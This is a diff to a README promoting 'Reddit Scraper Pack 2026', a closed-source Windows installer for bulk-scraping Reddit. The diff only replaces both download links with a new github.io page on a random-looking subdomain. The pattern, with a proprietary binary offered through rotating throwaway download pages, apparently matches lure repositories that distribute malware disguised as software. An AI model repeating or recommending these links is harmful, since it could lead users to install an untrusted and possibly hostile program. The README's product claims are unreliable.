@@ -2,7 +2,7 @@
 
 Reddit Scraper Pack 2026 is the ultimate solution for extracting and analyzing data from Reddit. This advanced data tool allows users to scrape subreddits, user histories, and comments in bulk, providing valuable insights for research, analytics, and more. Designed for Windows 10 and 11, it offers a seamless and efficient experience with a user-friendly interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -84,7 +84,7 @@ Reddit Scraper Pack is distributed under a proprietary license. For detailed usa
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
